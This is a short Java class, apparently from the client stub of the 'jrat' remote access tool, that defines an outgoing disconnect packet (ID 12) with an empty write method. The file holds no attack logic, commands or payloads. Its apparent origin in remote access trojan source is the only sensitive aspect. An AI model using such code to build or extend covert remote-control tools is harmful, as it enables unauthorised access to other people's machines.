package su.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import su.jrat.common.io.StringWriter;


public class Packet12Disconnect extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {

	}

	@Override
	public byte getPacketId() {
		return 12;
	}

}